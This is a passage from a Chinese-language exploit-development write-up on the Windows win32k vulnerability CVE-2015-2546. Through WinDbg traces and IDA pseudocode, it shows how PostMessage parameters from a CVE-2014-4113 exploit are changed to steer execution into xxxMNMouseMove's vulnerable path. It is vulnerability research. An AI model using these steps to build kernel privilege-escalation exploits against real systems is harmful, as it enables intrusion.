    eax=00000201
    kd> dd esi
    85c4bb0c  000f02a2 00000201 00000000 00000000
可以看到这里eax的值是0x201（刚才那个是0x200），也就是十进制的513，来看一下CVE-2014-4113里的过程，计算一下。
     v20 = v5 - 261;
        if ( v20 )
        {
          v21 = v20 - 1;
          if ( v21 )
          {
            v22 = v21 - 18;
            if ( !v22 )
              return 1;
            v23 = v22 - 232;
            if ( v23 )
            {
              if ( v23 == 1 )
              {
    LABEL_13:
                v12 = a2;
                *(_DWORD *)(a2 + 16) = -1;
                *(_DWORD *)(a2 + 8) = (signed __int16)v7;
                *(_DWORD *)(a2 + 12) = SHIWORD(v7);
                v13 = xxxMNFindWindowFromPoint(v3, (int)&UnicodeString, (int)v7);
                v52 = IsMFMWFPWindow(v13);
这里要计算最后v23的值，就从最上方v20的值开始向下判断，也就是v23=513-261-1-18-232=1，正好v23等于1，从而进入下面CVE-2014-4113的处理逻辑。v5的值，就是0x201，也就是513，那么这个值到底是什么呢，我们来查一下这个值。
    public enum WMessages : int
       {
           WM_LBUTTONDOWN = 0x201, //Left mousebutton down
           WM_LBUTTONUP = 0x202,  //Left mousebutton up
           WM_LBUTTONDBLCLK = 0x203, //Left mousebutton doubleclick
           WM_RBUTTONDOWN = 0x204, //Right mousebutton down
           WM_RBUTTONUP = 0x205,   //Right mousebutton up
           WM_RBUTTONDBLCLK = 0x206, //Right mousebutton doubleclick
           WM_KEYDOWN = 0x100,  //Key down
           WM_KEYUP = 0x101,   //Key up
       }
原来这个值就是WM_LBUTTONDOWN的值，正是CVE-2014-4113利用程序中MyWndProc中其中第三个PostMessage中调用到的第二个参数值，所以，我在这里，将我的Exploit中的PostMessage里第二个参数直接修改成0x200，重新运行程序，终于命中了MNMouseMove断点。接下来可以进入内层函数分析了。
进入内层函数后，我们需要想办法让程序执行到MNFindeWindowFromPoint函数调用的位置，但是我发现到其中一个判断的时候没法通过，会直接到退出的位置。
    kd> p
    win32k!xxxMNMouseMove+0x2f:
    9066941e 0f846f010000    je      win32k!xxxMNMouseMove+0x1a4 (90669593)
    kd> p
    win32k!xxxMNMouseMove+0x1a4:
    90669593 5f              pop     edi
来看一下IDA pro的伪代码。
    if ( (signed __int16)a3 != *(_DWORD *)(a2 + 8) || SHIWORD(a3) != *(_DWORD *)(a2 + 12) )
        {
只有上面伪代码中的if语句判断通过后，才能进入到漏洞的处理流程，动态跟踪一下这个过程。
    kd> p
    win32k!xxxMNMouseMove+0x26:
    90669415 c1ea10          shr     edx,10h
    kd> r edx
    edx=00000000
    kd> p
    win32k!xxxMNMouseMove+0x29:
    90669418 0fbfd2          movsx   edx,dx
    kd> r edx
    edx=00000000
    kd> p
    win32k!xxxMNMouseMove+0x2c:
    9066941b 3b570c          cmp     edx,dword ptr [edi+0Ch]
这最主要的原因就是对比的两个值都为0，从而不满足if语句的跳转，跳过了漏洞处理所需的逻辑流程，但是在我们利用鼠标移动的时候，却发现这个流程可以进入if语句判断。
    kd> p
    win32k!xxxHandleMenuMessages+0x2e8:
    90669061 e889030000      call    win32k!xxxMNMouseMove (906693ef)
    kd> dd esp
    85c47a98  fde8da68 9074f580 000f0059 9074f580 //000f0059
    kd> p
    win32k!xxxMNMouseMove+0x18:
    90669407 0fbfc1          movsx   eax,cx
    kd> r ecx
    ecx=000f0059
    kd> p
    win32k!xxxMNMouseMove+0x1b:
    9066940a 57              push    edi
    kd> p
    win32k!xxxMNMouseMove+0x1c:
    9066940b 8b7d0c          mov     edi,dword ptr [ebp+0Ch]
    kd> p
    win32k!xxxMNMouseMove+0x1f:
    9066940e 3b4708          cmp     eax,dword ptr [edi+8]
    kd> p
    win32k!xxxMNMouseMove+0x22:
    90669411 7511            jne     win32k!xxxMNMouseMove+0x35 (90669424)
    kd> p
    win32k!xxxMNMouseMove+0x35:
    90669424 894708          mov     dword ptr [edi+8],eax
    kd> r eax
    eax=00000059
鼠标移动的情况下，eax的值是0x59，并非0x00，那么这个值从哪里来呢，在进入MNMouseMove前看一下参数。
    kd> p
    win32k!xxxHandleMenuMessages+0x2e8:
    90669061 e889030000      call    win32k!xxxMNMouseMove (906693ef)
    kd> dd esp
    85c47a98  fde8da68 9074f580 000f0059 9074f580
通过IDA pro分析一下HandleMenuMessages函数，看看这个值是从哪里来。
    v5 = *(_DWORD *)(a1 + 4);
    v6 = *(_DWORD *)(a1 + 8);
    v7 = *(void **)(a1 + 12);
    xxxMNMouseMove(v3, a2, (int)v7);
是a1，也就是HandleMenuMessages的第一个参数，这样我们可以回到CVE-2014-4113中，在调用HandleMenuMessages的时候，直接查看第一个参数偏移+0Ch位置的值，看看这个值是不是由我们决定的。
    kd> p
    win32k!xxxHandleMenuMessages+0x1e:
    90668d96 8b4604          mov     eax,dword ptr [esi+4]
    kd> p
    win32k!xxxHandleMenuMessages+0x21:
    90668d99 8b5608          mov     edx,dword ptr [esi+8]
    kd> p
    win32k!xxxHandleMenuMessages+0x24:
    90668d9c 8b5e0c          mov     ebx,dword ptr [esi+0Ch]
    kd> r edx
    edx=00000000
    kd> p
    win32k!xxxHandleMenuMessages+0x27:
    90668d9f b904010000      mov     ecx,104h
    kd> r ebx
    ebx=00000000
    kd> r eax
    eax=00000201
可以看到ebx寄存器是esi+0ch的值，这个值是0，eax的值是0x201，回过头看一下正常Exploit中MyWndProc函数的PostMessages的参数调用。
    PostMessage(hwnd,WM_LBUTTONDOWN,0x00,0)
这个第三个第四个特定参数都是0x00，那么我觉得这个可能和MNMouseMove中的值有关，于是我尝试修改了CVE-2015-2546中PostMessage消息传递的特定参数。  
修改之后，我们重新跟踪调试。
    kd> p
    win32k!xxxHandleMenuMessages+0x21:
    90668d99 8b5608          mov     edx,dword ptr [esi+8]
    kd> p
    win32k!xxxHandleMenuMessages+0x24:
    90668d9c 8b5e0c          mov     ebx,dword ptr [esi+0Ch]
    kd> p
    win32k!xxxHandleMenuMessages+0x27:
    90668d9f b904010000      mov     ecx,104h
    kd> r edx
    edx=00110011
    kd> r ebx
    ebx=00110011
果然这个值可控了，而且esi指针的值就+4h是PostMessage第二个参数，+08h是第三个参数，+0Ch是第四个参数，接下来，MNMouseMove也能够正常进入if语句的处理流程了。
    kd> p
    win32k!xxxHandleMenuMessages+0x2e8:
    90669061 e889030000      call    win32k!xxxMNMouseMove (906693ef)
    kd> dd esp
    85d07a98  fde8da68 9074f580 00110011 9074f580
    kd> p
    win32k!xxxMNMouseMove+0x1f:
    9066940e 3b4708          cmp     eax,dword ptr [edi+8]
    kd> p
    win32k!xxxMNMouseMove+0x22:
    90669411 7511            jne     win32k!xxxMNMouseMove+0x35 (90669424)
    kd> r eax
    eax=00000011
    kd> p
    win32k!xxxMNMouseMove+0x35:
    90669424 894708          mov     dword ptr [edi+8],eax
**在HOOK中挣扎和Exploit**